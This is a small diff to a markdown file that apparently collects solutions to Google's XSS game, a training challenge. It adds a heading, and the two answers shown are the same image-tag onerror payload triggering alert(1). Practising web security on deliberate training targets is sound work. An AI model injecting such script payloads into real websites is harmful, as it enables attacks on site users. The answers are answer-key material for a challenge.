@@ -1,4 +1,5 @@
-https://xss-game.appspot.com
+## Google XSS game - solutions
+> https://xss-game.appspot.com
 
 1. `<img src=x onerror=alert(1)>`
 2. `<img src=x onerror=alert(1)>`
